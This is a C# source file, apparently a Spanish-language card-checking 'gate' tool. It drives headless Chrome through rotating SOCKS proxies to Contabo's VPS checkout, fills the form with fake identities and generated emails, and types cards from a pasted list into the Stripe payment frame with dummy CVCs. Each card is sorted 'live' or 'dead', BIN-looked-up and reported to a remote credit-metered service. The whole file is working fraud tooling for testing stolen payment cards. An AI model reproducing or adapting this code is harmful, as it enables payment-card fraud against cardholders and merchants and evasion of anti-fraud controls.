using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta.gates;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Danny
    {
        ChromeDriver driver;
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();
        int cambiarSock = 0;

        check check = new check();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            Socks socks = new Socks();
            var prox = socks.proxy();

            if (prox.Trim() == "0" || prox.Trim() == "")
            {
                MessageBox.Show("No hay socks disponibles");
                return;
            }

            var ip = prox.Split(':');
            var ipUp = ip[1].ToString().Replace("//", "");


            var verifiProxy=check.ping(Variables.key, prox);
            if (verifiProxy == false)
            {
                load();
            }


            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

            var lines = Form1.listCC.Lines.Count();
            if (lines > 0 && Variables.run==true)
            {


                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

              
                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--proxy-server=" + prox, "--ignore-certificate-errors" , "--headless");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                try
                {
                    driver.Url = "https://contabo.com/en/vps/vps-s-ssd/";
                }
                catch (Exception)
                {
                    socks.proxyUp(ipUp);
                    restart();
                }
              
                 
                Thread.Sleep(1000);


                if (IsElementPresent(By.XPath("//*[@id='main-message']/h1/span")))
                {
                    socks.proxyUp(ipUp);
                    restart();
                }

                if (IsElementPresent(By.XPath("/html/body")))
                {
                    if (driver.FindElement(By.XPath("/html/body")).Text.Trim() == "Backend not available")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                if (IsElementPresent(By.XPath("/html/body/div/div[1]/h1")))
                {
                    if (driver.FindElement(By.XPath("/html/body/div/div[1]/h1")).Text.Trim() == "Custom Message")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                if (IsElementPresent(By.XPath("/html/body/h2")))
                {
                    if (driver.FindElement(By.XPath("/html/body/h2")).Text.Trim() == "502 Bad Gateway")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }

                if (IsElementPresent(By.XPath("//*[@id='titles']/h1")))
                {
                    if (driver.FindElement(By.XPath("//*[@id='titles']/h1")).Text.Trim() == "ERROR")
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                }



                try
                {
                    if (IsElementPresent(By.XPath("//*[@id='sapper']/main/div/div[3]/aside[1]/div[1]/div/footer/div/a")))
                    {
                        driver.FindElement(By.XPath("//*[@id='sapper']/main/div/div[3]/aside[1]/div[1]/div/footer/div/a")).Click();
                        Thread.Sleep(200);

                        if (tiempoElemento(By.Id("first-name")))
                        {
                            driver.FindElement(By.Id("first-name")).SendKeys("DAVID");
                            Thread.Sleep(300);
                            driver.FindElement(By.Id("last-name")).SendKeys("REYES");
                            Thread.Sleep(300);
                            driver.FindElement(By.Id("address-line-1-personal")).SendKeys("AMBATO");
                            Thread.Sleep(300);
                            driver.FindElement(By.Id("city")).SendKeys("AMBATO");
                            Thread.Sleep(300);
                            driver.FindElement(By.Id("postcode")).SendKeys("180101");
                            Thread.Sleep(300);
                            driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/div/div[2]/main/div/div/div[2]/form/div[3]/div[7]/div/div/input")).Clear();
                            Thread.Sleep(1000);
                            if (IsElementPresent(By.XPath("/html/body/div[2]/div/div/div/div[2]/div[2]/div[1]/button")))
                            {
                                if (driver.FindElement(By.XPath("/html/body/div[2]/div/div/div/div[2]/div[2]/div[1]/button")).Displayed == true)
                                {
                                    driver.FindElement(By.XPath("/html/body/div[2]/div/div/div/div[2]/div[2]/div[1]/button")).Click();
                                    Thread.Sleep(2000);
                                }
                            }
                            driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/div/div[2]/main/div/div/div[2]/form/div[3]/div[7]/div/div/input")).SendKeys("Ecuador");
                            Thread.Sleep(1000);
                           
                            driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/div/div[2]/main/div/div/div[2]/form/div[3]/div[7]/div/div/div/div")).Click();
                            Thread.Sleep(1000);
                            driver.FindElement(By.Id("telephone")).SendKeys("0996269" + RandomNumber(100, 999).ToString());
                            Thread.Sleep(1000);
                            driver.FindElement(By.Id("email")).SendKeys(correo);
                            Thread.Sleep(500);
                            driver.FindElement(By.Id("confirm-email")).SendKeys(correo);
                            Thread.Sleep(1000);
                            driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/div/div[2]/main/div/div/div[2]/form/div[5]/div[1]/label/span[2]")).Click();
                            Thread.Sleep(1000);
                            driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/div/div[2]/main/div/div/div[2]/form/div[5]/div[3]/button")).Click();
                            Thread.Sleep(2000);

                            if (tiempoElemento(By.XPath("//*[@id='stripe-card-element']/div/iframe")))
                            {
                                Thread.Sleep(3000);
                                driver.Navigate().Refresh();
                                pago();

                            }
                            else
                            {
                                restart();
                            }


                        }
                        else
                        {
                            restart();
                        }

                    }
                    else
                    {
                        restart();
                    }
                }
                catch (Exception ex)
                {
                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop();
                    }

                   
                }


            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;
                cambiarSock = 0;
                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 20)
                    {

                        if (cambiarSock > 1)
                        {
                            restart();
                        }

                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];
                        var ccmes = ccLine[1];
                        var ccanio = ccLine[2].Remove(0, 2);

                        if (tiempoElemento(By.XPath("//*[@id='stripe-card-element']/div/iframe")))
                        {
                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("//*[@id='stripe-card-element']/div/iframe")));
                            Thread.Sleep(1000);


                            //for (var i = 0; i <= ccnum.Length - 1; i++)
                            //{
                            //    if (i == 0)
                            //    {
                            //        Thread.Sleep(500);
                            //    }
                            //    driver.FindElement(By.Id("number")).SendKeys(ccnum[i].ToString());
                            //    if (i == 0)
                            //    {
                            //        Thread.Sleep(500);
                            //    }
                            //    Thread.Sleep(300);
                            //}
                            Form1.circularProgressBar1.Value = 90;
                            Thread.Sleep(200);
                            //driver.ExecuteJavaScript("document.querySelector('#cardnumber').value='" + ccnum + "'");
                            //driver.FindElement(By.Name("cardnumber")).SendKeys(ccnum);

                            for (var i = 0; i <= ccnum.Length - 1; i++)
                            {
                                driver.FindElement(By.Name("cardnumber")).SendKeys(ccnum[i].ToString());
                                Thread.Sleep(200);
                            }

                            Thread.Sleep(500);

                            for (var i = 0; i <= 1; i++)
                            {
                                driver.FindElement(By.Name("exp-date")).SendKeys(ccmes[i].ToString());
                                Thread.Sleep(200);
                            }

                            Thread.Sleep(500);

                            for (var i = 0; i <= 1; i++)
                            {
                                driver.FindElement(By.Name("exp-date")).SendKeys(ccanio[i].ToString());
                                Thread.Sleep(200);
                            }
                            Thread.Sleep(500);

                            if (ccLine[3].Trim().Length == 3)
                            {
                                driver.FindElement(By.Name("cvc")).SendKeys("000");
                            }

                            if (ccLine[3].Trim().Length == 4)
                            {
                                driver.FindElement(By.Name("cvc")).SendKeys("0000");
                            }


                            Thread.Sleep(500);

                            if (IsElementPresent(By.Name("postal")))
                            {
                                driver.FindElement(By.Name("postal")).SendKeys("10001");
                                Thread.Sleep(500);
                            }

                            driver.SwitchTo().ParentFrame();
                            Thread.Sleep(1000);

                         

                            driver.FindElement(By.XPath("/html/body/div[1]/main/div[2]/div/div[2]/main/div/div/div/div/div/div[2]/div/div/form/div[5]/div[2]/button")).Click();
                            Thread.Sleep(3000);

                            if (confirmar())
                            {
                                Form1.circularProgressBar1.Value = 100;
                                var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
                                check.ccss(Variables.key, guardar, "lives");
                                Form1.textBox1.AppendText( cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
                                check.playlive();
                                Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                                Form1.textBox1.AppendText(Environment.NewLine);
                                Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                                numeroTargeta++;
                                pagos++;
                                restart();
                            }
                            else
                            {
                                Form1.circularProgressBar1.Value = 100;
                                var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate; ;
                                check.ccss(Variables.key, guardar, "deads");
                                Thread.Sleep(300);
                                Form1.textBox2.AppendText(cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
                                Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                                Form1.textBox2.AppendText(Environment.NewLine);
                                Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                                numeroTargeta++;
                                pagos++;
                                pago();
                            }
                        }
                        else
                        {
                            restart();
                        }

                        
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop();
                }
            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                
                
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex);
            }
          
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {

                    if (IsElementPresent(By.XPath("//*[@id='sapper']/main/div[2]/section/div/div[2]/aside/div/div[4]/button")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/section/div/div[2]/aside/div/div[4]/button")).Displayed == true)
                        {
                            {
                                driver.FindElement(By.XPath("//*[@id='sapper']/main/div[2]/section/div/div[2]/main/div/div/div/div[1]/div[2]/a")).Click();
                                Thread.Sleep(2000);
                                if (IsElementPresent(By.XPath("/html/body/div[1]/main/div[2]/div/div[2]/main/div/div/div/div/div/div[2]/div/div/form/div[2]/div[2]/a")))
                                {
                                    
                                            driver.FindElement(By.XPath("/html/body/div[1]/main/div[2]/div/div[2]/main/div/div/div/div/div/div[2]/div/div/form/div[2]/div[2]/a")).Click();
                                            Thread.Sleep(500);
                                             cambiarSock++;
                                            estado = "dead";
                                        
                                    
                                }
                            }
                        }


                    }

                  



                    if (IsElementPresent(By.XPath("/html/body/div[1]/main/div[2]/div/div[2]/main/div/div/div/div/div/div[2]/div/div/form/div[2]/span[2]")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[1]/main/div[2]/div/div[2]/main/div/div/div/div/div/div[2]/div/div/form/div[2]/span[2]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[1]/main/div[2]/div/div[2]/main/div/div/div/div/div/div[2]/div/div/form/div[2]/span[2]")).Text.Trim().Contains("código") || driver.FindElement(By.XPath("/html/body/div[1]/main/div[2]/div/div[2]/main/div/div/div/div/div/div[2]/div/div/form/div[2]/span[2]")).Text.Trim().Contains("code") )
                            {
                                estado = "live";
                            }
                            else
                            {
                                cambiarSock = 0;
                                estado = "dead";
                            }
                        }
                    }

                }
                else
                {
                    estado = "error";
                }
                tiempo++;
            }

            if (estado == "dead")
            {
                driver.Navigate().Refresh();
                Thread.Sleep(1000);
                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

